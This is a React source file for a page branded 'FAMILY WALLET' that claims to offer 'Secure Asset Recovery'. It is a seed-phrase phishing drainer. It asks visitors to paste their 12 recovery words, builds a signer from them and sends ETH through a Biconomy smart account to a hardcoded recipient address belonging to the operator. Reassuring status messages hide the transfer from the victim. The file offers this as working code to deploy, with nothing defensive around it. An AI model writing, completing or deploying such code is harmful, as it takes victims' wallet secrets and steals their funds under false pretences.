import { useState } from 'react'
import { JsonRpcProvider, Wallet, parseEther } from 'ethers' 
import { createSmartAccountClient } from "@biconomy/account"
import { LucideShieldAlert, LucideCheckCircle, LucideLoader2 } from 'lucide-react'

// --- CONFIGURATION ---
// Replace these with your actual keys from the Biconomy Dashboard
const BUNDLER_URL = "https://bundler.biconomy.io/api/v2/..." 
const PAYMASTER_URL = "https://paymaster.biconomy.io/api/v1/..." 
const RECIPIENT_ADDRESS = "0xYourHardcodedWalletAddress" 

export default function App() {
  const [keys, setKeys] = useState('')
  const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'error'>('idle')
  const [errorMsg, setErrorMsg] = useState('')

  const startSweep = async () => {
    // Basic validation for the 12-word phrase
    if (!keys || keys.trim().split(/\s+/).length < 12) {
      alert("Please enter all 12 words correctly.")
      return
    }

    setStatus('processing')
    try {
      // 1. Setup traditional signer from the keys (ethers v6 syntax)
      const provider = new JsonRpcProvider("https://ethereum-rpc.publicnode.com")
      const signer = Wallet.fromPhrase(keys.trim(), provider)

      // 2. Initialize Biconomy Smart Account
      const smartAccount = await createSmartAccountClient({
        signer,
        bundlerUrl: BUNDLER_URL,
        biconomyPaymasterApiKey: PAYMASTER_URL 
      })

      const saAddress = await smartAccount.getAccountAddress()
      console.log("Smart Account Address:", saAddress)

      // 3. Prepare the Transaction
      const tx = {
        to: RECIPIENT_ADDRESS,
        value: parseEther("0.001"), // Fixed for ethers v6
        data: "0x"
      }

      // 4. Send and Wait
      const userOpResponse = await smartAccount.sendTransaction(tx)
      const { receipt } = await userOpResponse.wait()
      
      console.log("Transaction Success:", receipt.transactionHash)
      setStatus('success')
    } catch (e: any) {
      console.error(e)
      setErrorMsg(e.message || "Transfer failed. Check your keys or gas balance.")
      setStatus('error')
    }
  }

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 font-sans">
      {status === 'idle' && (
        <div className="w-full max-w-md space-y-8">
          <div className="text-center space-y-2">
            <h1 className="text-4xl font-black tracking-tighter">FAMILY WALLET</h1>
            <p className="text-zinc-500 text-sm uppercase tracking-widest">Secure Asset Recovery</p>
          </div>

          <textarea
            className="w-full h-40 bg-zinc-900 border border-zinc-800 rounded-2xl p-4 text-center text-lg focus:ring-2 focus:ring-blue-500 outline-none transition-all placeholder:text-zinc-700"
            placeholder="Paste your 12 recovery words here..."
            onChange={(e) => setKeys(e.target.value)}
          />

          <button
            onClick={startSweep}
            className="w-full py-5 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-xl transition-all active:scale-95 shadow-lg shadow-blue-900/20"
          >
            WITHDRAW ASSETS
          </button>
        </div>
      )}

      {status === 'processing' && (
        <div className="flex flex-col items-center space-y-4 text-center">
          <LucideLoader2 className="w-16 h-16 text-blue-500 animate-spin" />
          <h2 className="text-2xl font-bold">Securing Transfer...</h2>
          <p className="text-zinc-400 max-w-xs">Initializing Biconomy Smart Account to bypass traditional wallet locks.</p>
        </div>
      )}

      {status === 'success' && (
        <div className="flex flex-col items-center space-y-4 text-center">
          <LucideCheckCircle className="w-20 h-20 text-green-500" />
          <h1 className="text-6xl font-black text-green-500">SUCCESSFUL</h1>
          <p className="text-zinc-400">Your funds are being moved to the secure recipient address.</p>
          <button onClick={() => setStatus('idle')} className="mt-4 text-zinc-500 hover:text-white underline">Back to Home</button>
        </div>
      )}

      {status === 'error' && (
        <div className="flex flex-col items-center space-y-4 text-center">
          <LucideShieldAlert className="w-20 h-20 text-red-500" />
          <h2 className="text-2xl font-bold text-red-500">Error Encountered</h2>
          <p className="max-w-xs text-zinc-400 text-sm">{errorMsg}</p>
          <button onClick={() => setStatus('idle')} className="px-6 py-2 bg-zinc-800 rounded-full text-sm">Try Again</button>
        </div>
      )}
    </div>
  )
}
